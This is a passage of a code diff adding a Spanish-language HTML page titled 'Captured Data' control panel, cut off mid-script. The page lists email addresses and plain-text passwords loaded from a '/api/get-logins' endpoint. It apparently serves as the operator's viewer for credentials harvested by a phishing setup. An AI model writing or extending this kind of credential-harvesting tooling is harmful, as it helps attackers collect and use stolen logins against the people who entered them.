@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control - Datos Capturados</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .login-item {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+            border-left: 4px solid #4285f4;
+        }
+        .email {
+            font-weight: bold;
+            font-size: 18px;
+            color: #2196F3;
+        }
+        .password {
+            font-family: monospace;
+            background-color: #eee;
+            padding: 5px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .meta {
+            color: #666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .refresh-btn {
+            background-color: #4285f4;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .refresh-btn:hover {
+            background-color: #3367d6;
+        }
+        .no-data {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Panel de Control - Datos Capturados</h1>
+        
+        <button id="refresh-btn" class="refresh-btn">Actualizar Datos</button>
+        
+        <div id="logins-container">
+            <p class="no-data">Cargando datos...</p>
+        </div>
+    </div>
+
+    <script>
+        // Función para cargar y mostrar los datos de inicio de sesión
+        async function loadLoginData() {
+            const container = document.getElementById('logins-container');
+            
+            try {
+                // Cargar desde el endpoint de tu API
+                const response = await fetch('/api/get-logins');
+                
+                if (response.ok) {
+                    const loginsData = await response.json();
+                    displayLogins(loginsData);
+                } else {
+                    container.innerHTML = '<p class="no-data">Error al cargar los datos
